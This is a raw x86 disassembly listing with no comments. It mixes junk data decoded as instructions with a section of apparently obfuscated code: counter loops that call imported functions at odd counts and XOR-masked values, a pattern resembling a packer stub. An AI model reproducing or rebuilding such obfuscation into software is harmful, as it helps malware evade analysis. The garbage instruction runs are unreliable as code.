  40c6c5:	jecxz  0x40c6a3
  40c6c7:	lods   al,BYTE PTR ds:[esi]
  40c6c8:	push   es
  40c6c9:	jnp    0x40c705
  40c6cb:	add    eax,0x45cdc75c
  40c6d0:	push   esi
  40c6d1:	push   edi
  40c6d2:	jmp    0xcf05:0x371fc6ad
  40c6d9:	add    bh,BYTE PTR [ecx-0x1676ff18]
  40c6df:	xlat   BYTE PTR ds:[ebx]
  40c6e0:	adc    bh,BYTE PTR [ecx-0x43cea967]
  40c6e6:	and    ch,0xec
  40c6e9:	xor    cl,dl
  40c6eb:	mov    bh,0xae
  40c6ed:	ror    DWORD PTR ds:0xdb4fb89a,1
  40c6f3:	fld    TBYTE PTR [esi]
  40c6f5:	cmp    ebp,ecx
  40c6f7:	or     al,0xa7
  40c6f9:	dec    esp
  40c6fa:	in     eax,dx
  40c6fb:	(bad)  
  40c6fc:	jmp    FWORD PTR [edi-0x3c]
  40c6ff:	jmp    0x35f0045
  40c704:	clc    
  40c705:	dec    ebx
  40c706:	push   es
  40c707:	push   cs
  40c708:	gs std 
  40c70a:	or     edi,esi
  40c70c:	add    BYTE PTR [ebx-0xc1c6a3a],0x5f
  40c713:	push   cs
  40c714:	in     eax,0x93
  40c716:	xor    bl,ah
  40c718:	push   cs
  40c719:	fdivr  DWORD PTR [esi-0x26152121]
  40c71f:	mulps  xmm4,xmm1
  40c722:	push   edi
  40c723:	sbb    al,0xee
  40c725:	nop
  40c726:	sub    DWORD PTR [edx+0x2d],esi
  40c729:	mov    esi,0x75fdce90
  40c72e:	inc    ebx
  40c72f:	mov    ch,BYTE PTR [edi]
  40c731:	mov    ds:0x7b9939cc,eax
  40c736:	lods   eax,DWORD PTR ds:[esi]
  40c737:	je     0x40c722
  40c739:	scas   eax,DWORD PTR es:[edi]
  40c73a:	ds push ds
  40c73c:	push   esp
  40c73d:	xor    bl,BYTE PTR [edi+eax*2]
  40c740:	pop    ebp
  40c741:	sti    
  40c742:	addr16 inc ebx
  40c744:	jb     0x40c765
  40c746:	jno    0x40c772
  40c748:	cli    
  40c749:	push   ds
  40c74a:	leave  
  40c74b:	jae    0x40c755
  40c74d:	pop    eax
  40c74e:	adc    dh,BYTE PTR [ebx]
  40c750:	pop    esp
  40c751:	div    BYTE PTR [edx+eax*8+0x6a5a6257]
  40c758:	sub    dh,BYTE PTR [ebx+0x5f]
  40c75b:	test   BYTE PTR [eax+0x2a],0x89
  40c75f:	cmp    bl,0xa1
  40c762:	in     al,dx
  40c763:	xlat   BYTE PTR ds:[ebx]
  40c764:	fsubr  st,st(4)
  40c766:	loopne 0x40c796
  40c768:	sahf   
  40c769:	sbb    BYTE PTR ds:0x177d3079,bl
  40c76f:	add    ecx,esi
  40c771:	call   0x791328c0
  40c776:	mov    BYTE PTR [eax+0x1f0d2923],bl
  40c77c:	outs   dx,BYTE PTR ds:[esi]
  40c77d:	bound  esi,QWORD PTR [edi-0x6b]
  40c780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c781:	xchg   ebx,eax
  40c782:	mov    eax,0x892c0d31
  40c787:	or     edi,DWORD PTR [edx-0x344b4f2c]
  40c78d:	inc    esp
  40c78e:	call   0x19e:0xdf76a259
  40c795:	cmp    bh,BYTE PTR [eax]
  40c797:	xchg   esi,eax
  40c798:	dec    eax
  40c799:	xchg   DWORD PTR [edi],ebx
  40c79b:	cld    
  40c79c:	push   cs
  40c79d:	mov    bh,0x81
  40c79f:	and    DWORD PTR [ebp+0x8e6674c],0xe99b7b0b
  40c7a9:	mov    esi,0x12574a53
  40c7ae:	mov    eax,0x73bc8cfe
  40c7b3:	and    ebp,edx
  40c7b5:	shr    edx,0x74
  40c7b8:	rcl    BYTE PTR [edx+0x5c],0xa2
  40c7bc:	inc    esp
  40c7bd:	jbe    0x40c829
  40c7bf:	sti    
  40c7c0:	sbb    BYTE PTR [ecx*1+0x3c0e1f09],ch
  40c7c7:	repz stc 
  40c7c9:	psrlw  mm4,QWORD PTR [eax-0x1c5c9ff7]
  40c7d0:	mov    ch,0x37
  40c7d2:	lods   al,BYTE PTR ds:[esi]
  40c7d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7d4:	mov    bl,0x49
  40c7d6:	push   ds
  40c7d7:	and    al,bh
  40c7d9:	fild   QWORD PTR [ebp+0x2809fc5a]
  40c7df:	cs jne 0x40c7ff
  40c7e2:	pop    ds
  40c7e3:	popf   
  40c7e4:	adc    al,0x51
  40c7e6:	mov    bh,ah
  40c7e8:	add    ecx,DWORD PTR ds:0xe48b70fa
  40c7ee:	adc    al,BYTE PTR [edx+ecx*2-0x8a45fa6]
  40c7f5:	mov    DWORD PTR [edx],ebp
  40c7f7:	and    BYTE PTR [edi-0x2d],dh
  40c7fa:	xor    esp,DWORD PTR [esi]
  40c7fc:	(bad)  
  40c7fd:	xor    dl,BYTE PTR [ebx+eiz*1-0x70]
  40c801:	inc    ecx
  40c802:	stos   BYTE PTR es:[edi],al
  40c803:	ss mov bh,0x68
  40c806:	call   0xa98c5347
  40c80b:	mov    ah,0x7c
  40c80d:	xchg   ecx,eax
  40c80e:	aam    0xd3
  40c810:	mov    BYTE PTR [edi+0x3c4890bf],bl
  40c816:	inc    edx
  40c817:	cmp    al,0x89
  40c819:	repz xor DWORD PTR [edi-0xb],0x4c
  40c81e:	(bad)  
  40c81f:	or     al,0x4d
  40c821:	sahf   
  40c822:	lea    ecx,[eax-0x482dcde8]
  40c828:	mov    edi,0xa3f3db21
  40c82d:	jmp    DWORD PTR [esi-0x5f]
  40c830:	ds push 0xffffffc3
  40c833:	dec    esp
  40c834:	cld    
  40c835:	out    0x1,al
  40c837:	lods   al,BYTE PTR ds:[esi]
  40c838:	jge    0x40c8b9
  40c83a:	retf   0x13ed
  40c83d:	das    
  40c83e:	mov    dh,0xe0
  40c840:	inc    esp
  40c841:	jmp    0xe994:0x1b030c20
  40c848:	fst    DWORD PTR [esi+0x5bb57fa7]
  40c84e:	ins    BYTE PTR es:[edi],dx
  40c84f:	loope  0x40c800
  40c851:	call   0x518f254d
  40c856:	scas   eax,DWORD PTR es:[edi]
  40c857:	daa    
  40c858:	popf   
  40c859:	retf   
  40c85a:	rcr    dh,0xac
  40c85d:	std    
  40c85e:	inc    ebp
  40c85f:	jb     0x40c85a
  40c861:	shl    BYTE PTR [edi+0x23],cl
  40c864:	sub    edx,ebx
  40c866:	dec    esp
  40c867:	stc    
  40c868:	mov    esi,0x7881b42
  40c86d:	call   0x9c04:0xe8de2d79
  40c874:	loope  0x40c87a
  40c876:	loope  0x40c8e8
  40c878:	cmp    ah,BYTE PTR [ebp-0x78]
  40c87b:	mov    bh,cl
  40c87d:	inc    ebx
  40c87e:	sbb    ebp,ebx
  40c880:	adc    ebx,esi
  40c882:	lods   eax,DWORD PTR ds:[esi]
  40c883:	popf   
  40c884:	stc    
  40c885:	jns    0x40c816
  40c887:	repz das 
  40c889:	and    dl,0xf3
  40c88c:	(bad)  
  40c88d:	ja     0x40c86a
  40c88f:	push   ss
  40c890:	repz and al,0x6c
  40c893:	jecxz  0x40c8dc
  40c895:	xchg   ecx,eax
  40c896:	loopne 0x40c862
  40c898:	je     0x40c869
  40c89a:	(bad)  
  40c89b:	push   edx
  40c89c:	mov    ebp,cs
  40c89e:	in     al,0x74
  40c8a0:	or     DWORD PTR [edx-0x7be66bec],edx
  40c8a6:	sub    ecx,DWORD PTR [ebx]
  40c8a8:	add    ebx,DWORD PTR [ecx+0x3b]
  40c8ab:	and    edx,edi
  40c8ad:	mov    esp,0xe8f9e794
  40c8b2:	push   es
  40c8b3:	mov    al,0xa6
  40c8b5:	lods   eax,DWORD PTR ds:[esi]
  40c8b6:	adc    bh,BYTE PTR [esi]
  40c8b8:	pop    ss
  40c8b9:	out    0x7e,eax
  40c8bb:	into   
  40c8bc:	xchg   ecx,eax
  40c8bd:	dec    esi
  40c8be:	mov    edx,0xa42dbcaa
  40c8c3:	xchg   ebx,eax
  40c8c4:	test   eax,0x60d47839
  40c8c9:	dec    eax
  40c8ca:	hlt    
  40c8cb:	dec    eax
  40c8cc:	sahf   
  40c8cd:	jecxz  0x40c920
  40c8cf:	cmp    BYTE PTR [ecx-0x75f72765],al
  40c8d5:	push   0x63a011e0
  40c8da:	scas   al,BYTE PTR es:[edi]
  40c8db:	jle    0x40c899
  40c8dd:	add    eax,0x4b5b0e7f
  40c8e2:	xor    al,0x5f
  40c8e4:	inc    ebx
  40c8e5:	and    dh,BYTE PTR [ebp+esi*2-0x3c]
  40c8e9:	dec    ecx
  40c8ea:	push   ecx
  40c8eb:	sbb    eax,DWORD PTR [ecx+0x63ebba25]
  40c8f1:	lods   al,BYTE PTR ds:[esi]
  40c8f2:	inc    ebx
  40c8f3:	inc    eax
  40c8f4:	dec    ebp
  40c8f5:	pop    esi
  40c8f6:	aaa    
  40c8f7:	sbb    eax,0x4c54d98a
  40c8fc:	fld    TBYTE PTR [edi]
  40c8fe:	push   0xb087e183
  40c903:	push   0x6406172e
  40c908:	nop
  40c909:	imul   esp,DWORD PTR [edi],0xffffff92
  40c90c:	fldenv [ebp+edx*1-0x721af64c]
  40c913:	sub    al,0x87
  40c915:	out    0x94,al
  40c917:	mov    WORD PTR [edi+ebp*8+0x22],ds
  40c91b:	scas   eax,DWORD PTR es:[edi]
  40c91c:	jecxz  0x40c90d
  40c91e:	or     cl,BYTE PTR [ecx-0x39656f03]
  40c924:	push   eax
  40c925:	addr16 inc ebx
  40c927:	push   0x9ad34e00
  40c92c:	sub    BYTE PTR [edi+0x1f],0x5
  40c930:	in     al,0xb4
  40c932:	scas   al,BYTE PTR es:[edi]
  40c933:	cmp    eax,0xca3d8733
  40c938:	fistp  QWORD PTR [ebx+0x2c]
  40c93b:	or     eax,edi
  40c93d:	mov    edi,0xd15096f
  40c942:	push   cs
  40c943:	out    dx,eax
  40c944:	xlat   BYTE PTR ds:[ebx]
  40c945:	icebp  
  40c946:	push   cs
  40c947:	test   eax,0x95809892
  40c94c:	enter  0x518c,0xec
  40c950:	popf   
  40c951:	sub    ebp,DWORD PTR [ebx-0x6a4f8bb]
  40c957:	sbb    al,0x14
  40c959:	or     eax,DWORD PTR [esi+0x25d16cda]
  40c95f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40c966:	xor    DWORD PTR ds:0x413d34,0x2984
  40c970:	mov    ecx,DWORD PTR [ebp-0x14]
  40c973:	and    DWORD PTR ds:0x413d24,0x0
  40c97d:	jmp    0x40c990
  40c982:	xor    eax,eax
  40c984:	or     eax,DWORD PTR ds:0x413d24
  40c98a:	inc    eax
  40c98b:	mov    ds:0x413d24,eax
  40c990:	cmp    DWORD PTR ds:0x413d24,0x18
  40c997:	jae    0x40ca0e
  40c99d:	cmp    DWORD PTR ds:0x413d24,0x20
  40c9a4:	jne    0x40c9bd
  40c9aa:	push   0x738d
  40c9af:	push   0x6edb
  40c9b4:	push   DWORD PTR [ebp-0x18]
  40c9b7:	call   DWORD PTR ds:0x416768
  40c9bd:	jmp    0x40c982
  40c9c2:	mov    DWORD PTR ds:0x413c1e,0x1e
  40c9cc:	cmp    DWORD PTR ds:0x413c1e,0x0
  40c9d3:	je     0x40ca0e
  40c9d9:	cmp    DWORD PTR ds:0x413c1e,0x2c
  40c9e0:	jne    0x40c9fe
  40c9e6:	push   0x25a0
  40c9eb:	push   0x413ce4
  40c9f0:	push   0x3cd5
  40c9f5:	push   DWORD PTR [ebp-0x18]
  40c9f8:	call   DWORD PTR ds:0x416770
  40c9fe:	mov    eax,ds:0x413c1e
  40ca03:	dec    eax
  40ca04:	mov    ds:0x413c1e,eax
  40ca09:	jmp    0x40c9cc
  40ca0e:	push   esi
  40ca0f:	sbb    DWORD PTR ds:0x413ce4,0x7973
  40ca19:	mov    eax,0x7510894
  40ca1e:	and    DWORD PTR ds:0x413c1e,0x0
  40ca28:	jmp    0x40ca3a
  40ca2d:	mov    esi,DWORD PTR ds:0x413c1e
  40ca33:	inc    esi
  40ca34:	mov    DWORD PTR ds:0x413c1e,esi
  40ca3a:	cmp    DWORD PTR ds:0x413c1e,0x15
  40ca41:	jae    0x40ca74
  40ca47:	cmp    DWORD PTR ds:0x413c1e,0x1f
  40ca4e:	jne    0x40ca6e
  40ca54:	push   0x413c12
  40ca59:	push   0x88a1
  40ca5e:	push   0x416000
  40ca63:	push   0x416152
  40ca68:	call   DWORD PTR ds:0x416774
  40ca6e:	jmp    0x40ca2d
  40ca73:	inc    esi
  40ca74:	xor    ecx,eax
  40ca76:	sub    esi,DWORD PTR ds:0x413c70
  40ca7c:	mov    esi,0x3272dc
  40ca81:	mov    DWORD PTR ds:0x413c80,0x12bb
  40ca8b:	push   edi
  40ca8c:	xor    DWORD PTR ds:0x413ce4,0x413c6c
  40ca96:	add    ecx,esi
  40ca98:	jmp    0x40cab4
  40ca9d:	mov    dl,BYTE PTR [ebp-0x1]
  40caa0:	not    DWORD PTR ds:0x41400c
  40caa6:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40caad:	not    DWORD PTR ds:0x413ce8
  40cab3:	inc    ecx
  40cab4:	cmp    ecx,0x40
  40cab7:	mov    DWORD PTR ds:0x413d24,0x3f58
  40cac1:	jb     0x40ca9d
  40cac7:	adc    edx,0x503d
  40cacd:	mov    edx,DWORD PTR [ebp-0x14]
  40cad0:	xor    edx,eax
  40cad2:	add    edx,esi
  40cad4:	jmp    0x40cc01
  40cad9:	and    DWORD PTR ds:0x413c0a,0x1a66
  40cae3:	mov    edi,DWORD PTR [ebp+0x8]
  40cae6:	and    ecx,0xcf4
  40caec:	mov    ecx,0x8a87
  40caf1:	adc    DWORD PTR ds:0x413c12,0x413d
  40cafb:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40cb00:	and    DWORD PTR ds:0x41401c,0x0
  40cb0a:	mov    edi,DWORD PTR ds:0x41401c
  40cb10:	inc    edi
  40cb11:	mov    DWORD PTR ds:0x41401c,edi
  40cb17:	cmp    DWORD PTR ds:0x41401c,0x5
  40cb1e:	jne    0x40cb39
  40cb24:	push   0x6acf
  40cb29:	push   0x413cf4
  40cb2e:	push   0x416152
  40cb33:	call   DWORD PTR ds:0x416778
  40cb39:	cmp    DWORD PTR ds:0x41401c,0x4
  40cb40:	jne    0x40cb53
  40cb46:	mov    edi,DWORD PTR ds:0x41401c
  40cb4c:	inc    edi
  40cb4d:	mov    DWORD PTR ds:0x41401c,edi
  40cb53:	cmp    DWORD PTR ds:0x41401c,0x1b
  40cb5a:	jb     0x40cb0a
  40cb60:	mov    DWORD PTR ds:0x414018,0x15
  40cb6a:	cmp    DWORD PTR ds:0x414018,0x0
  40cb71:	je     0x40cbab
  40cb77:	cmp    DWORD PTR ds:0x414018,0x1b
  40cb7e:	jne    0x40cb8f
  40cb84:	push   0x4160b3
  40cb89:	call   DWORD PTR ds:0x41677c
  40cb8f:	mov    edi,DWORD PTR ds:0x414018
  40cb95:	dec    edi
  40cb96:	mov    DWORD PTR ds:0x414018,edi
  40cb9c:	jmp    0x40cb6a
  40cba1:	xor    DWORD PTR ds:0x414008,0x3196
  40cbab:	mov    edi,0x3b4a
  40cbb0:	add    cx,di
  40cbb3:	sbb    DWORD PTR ds:0x414000,0x24d3
  40cbbd:	movzx  ecx,cx
  40cbc0:	xor    DWORD PTR ds:0x413bfe,0x413c06
  40cbca:	mov    DWORD PTR [ebp-0x10],ecx
  40cbcd:	neg    DWORD PTR ds:0x413c0e
  40cbd3:	mov    ecx,DWORD PTR [ebp+0x8]
  40cbd6:	or     DWORD PTR ds:0x413d20,0x3470
  40cbe0:	movzx  ecx,WORD PTR [ecx+edx*4]
  40cbe4:	xor    DWORD PTR ds:0x413d30,0x413bf6
  40cbee:	xor    ecx,0x8a87
  40cbf4:	add    ecx,edi
  40cbf6:	mov    edi,DWORD PTR [ebp-0x10]
  40cbf9:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40cc00:	inc    edx
  40cc01:	mov    ecx,DWORD PTR [ebp-0x18]
  40cc04:	cmp    edx,ecx
  40cc06:	mov    DWORD PTR ds:0x414010,0x5811
  40cc10:	jne    0x40cad9
  40cc16:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc19:	mov    DWORD PTR ds:0x413d1c,0x410a
  40cc23:	mov    edx,DWORD PTR [ebp+0x10]
  40cc26:	dec    DWORD PTR ds:0x413cec
  40cc2c:	xor    ecx,eax
  40cc2e:	add    ecx,esi
  40cc30:	and    DWORD PTR ds:0x413c0a,0x5ecf
  40cc3a:	mov    DWORD PTR [edx],ecx
  40cc3c:	dec    ecx
  40cc3d:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc40:	xor    ecx,eax
  40cc42:	and    DWORD PTR ds:0x413bf6,0x413c84
  40cc4c:	add    ecx,esi
  40cc4e:	mov    DWORD PTR ds:0x413c0a,0x45cc
  40cc58:	mov    DWORD PTR [ebp-0x20],ecx
  40cc5b:	not    ecx
  40cc5d:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  40cc64:	mov    DWORD PTR [ebp-0xc],0xf89c85a0
  40cc6b:	mov    DWORD PTR [ebp-0x1c],0xf89c95b0
  40cc72:	mov    DWORD PTR ds:0x413c6c,edi
  40cc78:	mov    ecx,DWORD PTR [ebp-0xc]
  40cc7b:	mov    DWORD PTR ds:0x413c84,0x129c
  40cc85:	mov    DWORD PTR [ebp+0x8],ecx
  40cc88:	jmp    0x40ce75
  40cc8d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc90:	add    edx,DWORD PTR ds:0x413c80
  40cc96:	mov    edx,DWORD PTR [ebp-0x8]
  40cc99:	and    DWORD PTR ds:0x413c74,0x413d20
  40cca3:	xor    ecx,eax
  40cca5:	xor    edx,eax
  40cca7:	sub    ecx,edx
  40cca9:	sub    ecx,esi
  40ccab:	xor    ecx,eax
  40ccad:	and    DWORD PTR ds:0x413c1a,0x0
  40ccb7:	mov    edx,DWORD PTR ds:0x413c1a
  40ccbd:	inc    edx
  40ccbe:	mov    DWORD PTR ds:0x413c1a,edx
  40ccc4:	cmp    DWORD PTR ds:0x413c1a,0x9
  40cccb:	jne    0x40cce4
  40ccd1:	push   0x413bfe
  40ccd6:	push   DWORD PTR [ebp-0x20]
  40ccd9:	push   0x4160ed
  40ccde:	call   DWORD PTR ds:0x416780
  40cce4:	cmp    DWORD PTR ds:0x413c1a,0x8
  40cceb:	jne    0x40ccfe
  40ccf1:	mov    edx,DWORD PTR ds:0x413c1a
  40ccf7:	inc    edx
  40ccf8:	mov    DWORD PTR ds:0x413c1a,edx
  40ccfe:	cmp    DWORD PTR ds:0x413c1a,0x10
  40cd05:	jb     0x40ccb7
  40cd0b:	mov    DWORD PTR [ebp+0x8],ecx
  40cd0e:	adc    ecx,ecx
  40cd10:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd13:	mov    DWORD PTR ds:0x413c16,0x3405
  40cd1d:	mov    edx,DWORD PTR [ebp-0x64]
  40cd20:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd27:	mov    DWORD PTR [ebp-0x64],ecx
  40cd2a:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd2d:	mov    edx,DWORD PTR [ebp-0x60]
  40cd30:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd37:	movzx  edx,WORD PTR ds:0x413d20
  40cd3e:	sbb    edx,DWORD PTR ds:0x413d28
  40cd44:	mov    DWORD PTR ds:0x413d20,edx
  40cd4a:	mov    DWORD PTR [ebp-0x60],ecx
  40cd4d:	and    DWORD PTR ds:0x414000,0x413d1c
  40cd57:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd5a:	add    DWORD PTR ds:0x413c78,ebx
  40cd60:	mov    edx,DWORD PTR [ebp-0x5c]
  40cd63:	neg    DWORD PTR ds:0x413c02
  40cd69:	lea    ecx,[edx+ecx*1+0x5708f2]
  40cd70:	and    DWORD PTR ds:0x413d20,0x0
  40cd7a:	mov    edx,DWORD PTR ds:0x413d20
  40cd80:	inc    edx
  40cd81:	mov    DWORD PTR ds:0x413d20,edx
  40cd87:	cmp    DWORD PTR ds:0x413d20,0xa
  40cd8e:	jne    0x40cda2
  40cd94:	push   0x413d34
  40cd99:	push   DWORD PTR [ebp-0x24]
  40cd9c:	call   DWORD PTR ds:0x416784
  40cda2:	cmp    DWORD PTR ds:0x413d20,0x9
  40cda9:	jne    0x40cdbe
  40cdaf:	xor    edx,edx
  40cdb1:	add    edx,DWORD PTR ds:0x413d20
  40cdb7:	inc    edx
  40cdb8:	mov    DWORD PTR ds:0x413d20,edx
  40cdbe:	cmp    DWORD PTR ds:0x413d20,0x15
  40cdc5:	jb     0x40cd7a
  40cdcb:	or     DWORD PTR ds:0x413ce8,0x2ce1
  40cdd5:	mov    DWORD PTR [ebp-0x5c],ecx
  40cdd8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cddb:	add    DWORD PTR ds:0x413c1e,ecx
  40cde1:	mov    edx,DWORD PTR [ebp-0x58]
  40cde4:	lea    ecx,[edx+ecx*1+0x5708f3]
  40cdeb:	add    DWORD PTR ds:0x413bfe,ebx
  40cdf1:	mov    DWORD PTR [ebp-0x58],ecx
  40cdf4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cdf7:	or     DWORD PTR ds:0x413c80,0x1524
  40ce01:	mov    edx,DWORD PTR [ebp-0x54]
  40ce04:	lea    ecx,[edx+ecx*1+0x5708fc]
  40ce0b:	adc    edx,DWORD PTR ds:0x41400c
  40ce11:	mov    DWORD PTR [ebp-0x54],ecx
  40ce14:	and    DWORD PTR ds:0x413d20,0x0
  40ce1e:	mov    edx,DWORD PTR ds:0x413d20
  40ce24:	inc    edx
  40ce25:	mov    DWORD PTR ds:0x413d20,edx
  40ce2b:	cmp    DWORD PTR ds:0x413d20,0x12
  40ce32:	jne    0x40ce48
  40ce38:	push   0x8060
  40ce3d:	push   0x41608d
  40ce42:	call   DWORD PTR ds:0x41678c
  40ce48:	cmp    DWORD PTR ds:0x413d20,0x10
  40ce4f:	jb     0x40ce1e
  40ce55:	mov    ecx,DWORD PTR [ebp+0x8]
  40ce58:	sbb    edx,DWORD PTR ds:0x413c0e
  40ce5e:	mov    edx,DWORD PTR [ebp-0x50]
  40ce61:	sbb    DWORD PTR ds:0x413cf4,0x413c16
  40ce6b:	lea    ecx,[edx+ecx*1+0x5708fd]
  40ce72:	mov    DWORD PTR [ebp-0x50],ecx
  40ce75:	and    DWORD PTR ds:0x413c12,0x0
  40ce7f:	mov    ecx,DWORD PTR ds:0x413c12
  40ce85:	inc    ecx
  40ce86:	mov    DWORD PTR ds:0x413c12,ecx
  40ce8c:	cmp    DWORD PTR ds:0x413c12,0x1d
  40ce93:	jne    0x40ceb7
  40ce99:	push   DWORD PTR [ebp-0x20]
  40ce9c:	push   0x413c70
  40cea1:	push   0x4dec
  40cea6:	push   0x4160bf
  40ceab:	push   DWORD PTR [ebp-0x20]
  40ceae:	push   DWORD PTR [ebp-0x10]
  40ceb1:	call   DWORD PTR ds:0x416790
  40ceb7:	cmp    DWORD PTR ds:0x413c12,0x11
  40cebe:	jb     0x40ce7f
  40cec4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cec7:	xor    ecx,eax
  40cec9:	add    ecx,esi
  40cecb:	jne    0x40cc8d
  40ced1:	jmp    0x40f43d
  40ced6:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ced9:	mov    edx,DWORD PTR [ebp-0x8]
  40cedc:	xor    ecx,eax
  40cede:	xor    edx,eax
  40cee0:	sub    ecx,edx
  40cee2:	sub    ecx,esi
  40cee4:	xor    ecx,eax
  40cee6:	mov    DWORD PTR [ebp-0x1c],ecx
  40cee9:	mov    ecx,DWORD PTR [ebp-0xc]
  40ceec:	mov    DWORD PTR [ebp+0x8],ecx
  40ceef:	jmp    0x40cf21
  40cef4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cef7:	mov    edx,DWORD PTR [ebp-0x8]
  40cefa:	xor    ecx,eax
  40cefc:	xor    edx,eax
  40cefe:	sub    ecx,edx
  40cf00:	sub    ecx,esi
  40cf02:	xor    ecx,eax
  40cf04:	mov    DWORD PTR [ebp+0x8],ecx
  40cf07:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf0a:	mov    edx,DWORD PTR [ebp+0x8]
  40cf0d:	imul   edx,edx,0x5708f1
  40cf13:	xor    ecx,eax
  40cf15:	add    ecx,esi
  40cf17:	lea    ecx,[ebp+ecx*4-0x64]
  40cf1b:	mov    edi,DWORD PTR [ecx]
  40cf1d:	add    edx,edi
  40cf1f:	mov    DWORD PTR [ecx],edx
  40cf21:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf24:	xor    ecx,eax
  40cf26:	add    ecx,esi
  40cf28:	jne    0x40cef4
  40cf2e:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf31:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf38:	mov    dl,BYTE PTR [ebp-0x1]
  40cf3b:	cmp    cl,dl
  40cf3d:	je     0x40f39e
  40cf43:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf46:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf4d:	mov    edx,DWORD PTR [ebp+0xc]
  40cf50:	cmp    cl,BYTE PTR [edx]
  40cf52:	jne    0x40f44f
  40cf58:	mov    ecx,DWORD PTR [ebp-0x14]
  40cf5b:	mov    edx,DWORD PTR [ebp+0xc]
  40cf5e:	movsx  edx,BYTE PTR [edx]
  40cf61:	xor    ecx,eax
  40cf63:	add    ecx,esi
  40cf65:	cmp    edx,ecx
  40cf67:	mov    ecx,DWORD PTR [ebp-0xc]
  40cf6a:	mov    DWORD PTR [ebp+0x8],ecx
  40cf6d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf70:	je     0x411851
  40cf76:	jmp    0x40cfab
  40cf7b:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf7e:	mov    edx,DWORD PTR [ebp-0x8]
  40cf81:	xor    ecx,eax
  40cf83:	xor    edx,eax
  40cf85:	sub    ecx,edx
  40cf87:	sub    ecx,esi
  40cf89:	xor    ecx,eax
  40cf8b:	mov    DWORD PTR [ebp+0x8],ecx
  40cf8e:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf91:	mov    edx,DWORD PTR [ebp+0x8]
  40cf94:	xor    ecx,eax
  40cf96:	imul   edx,edx,0x5708f1
  40cf9c:	add    ecx,esi
  40cf9e:	lea    ecx,[ebp+ecx*4-0x64]
  40cfa2:	mov    edi,DWORD PTR [ecx]
  40cfa4:	add    edx,edi
  40cfa6:	mov    DWORD PTR [ecx],edx
  40cfa8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cfab:	xor    ecx,eax
  40cfad:	add    ecx,esi
  40cfaf:	jne    0x40cf7b
  40cfb5:	mov    ecx,DWORD PTR [ebp-0x14]
  40cfb8:	mov    edx,DWORD PTR [ebp+0x8]
  40cfbb:	xor    ecx,eax
  40cfbd:	xor    edx,eax
  40cfbf:	add    ecx,esi
  40cfc1:	add    edx,esi
  40cfc3:	cmp    ecx,edx
  40cfc5:	jae    0x40f3e3
  40cfcb:	lea    edx,[ecx-0x3272dc]
  40cfd1:	mov    DWORD PTR [ebp-0x18],edx
  40cfd4:	mov    edi,DWORD PTR [ebp-0x18]
  40cfd7:	mov    DWORD PTR [ebp-0x24],0x705fd0e
  40cfde:	lea    edx,[ebp-0x24]
  40cfe1:	mov    DWORD PTR [ebp-0x10],edx
  40cfe4:	mov    edx,DWORD PTR [ebp-0x10]
  40cfe7:	add    DWORD PTR [edx],0x705fa0e
  40cfed:	mov    ebx,DWORD PTR [ebp-0x10]
  40cff0:	xor    edi,eax
  40cff2:	add    edi,DWORD PTR [ebx]
  40cff4:	lea    edx,[ebp+ecx*4-0x64]
  40cff8:	jmp    0x40f380
  40cffd:	sar    BYTE PTR [ebx-0x74043cf0],1
  40d003:	jae    0x40cfc0
  40d005:	dec    ebp
  40d006:	bound  esi,QWORD PTR [eax-0x39be98a3]
  40d00c:	scas   eax,DWORD PTR es:[edi]
  40d00d:	mov    dl,0xe9
  40d00f:	jl     0x40d08d
  40d011:	pop    es
  40d012:	pop    edi
  40d013:	jl     0x40d091
  40d015:	js     0x40d01b
  40d017:	mov    cl,0x8e
  40d019:	mov    edi,0x9e9cdac9
  40d01e:	inc    edi
  40d01f:	pop    ds
  40d020:	nop    ebx
  40d023:	cld    
  40d024:	jp     0x40d007
  40d026:	popa   
  40d027:	xchg   edx,eax
  40d028:	sub    al,0x99
  40d02a:	bnd fs jl 0x40d046
  40d02e:	mov    ebx,0xf4b2ba32
  40d033:	xor    DWORD PTR [edx],ebx
  40d035:	repz js 0x40d05b
  40d038:	pop    ebp
  40d039:	dec    esp
  40d03a:	mov    esp,0x29b61051
  40d03f:	pop    DWORD PTR [ebx]
  40d041:	xchg   edx,eax
  40d042:	mov    ebp,0xc0ae9e57
  40d047:	aaa    
  40d048:	call   0x4bc17d57
  40d04d:	ja     0x40cfe9
  40d04f:	dec    eax
  40d050:	mov    esi,0x1c203cdb
  40d055:	cs aas 
  40d057:	pushf  
  40d058:	fisttp WORD PTR [eax-0xff6048b]
  40d05e:	jo     0x40d0d2
  40d060:	(bad)  [edi]
  40d062:	call   0x58e17ed5
  40d067:	pop    esp
  40d068:	das    
  40d069:	call   0x6f58:0x75ac288e
  40d070:	jge    0x40d0aa
  40d072:	mov    cl,0x68
  40d074:	ret    
  40d075:	adc    BYTE PTR [esp+edi*4+0x65],al
  40d079:	mov    bl,0x71
  40d07b:	imul   edi,DWORD PTR [ebx+eiz*1],0xea1d0267
  40d082:	ss daa 
  40d084:	xor    BYTE PTR [eax],bh
  40d086:	sub    eax,0xef269ee5
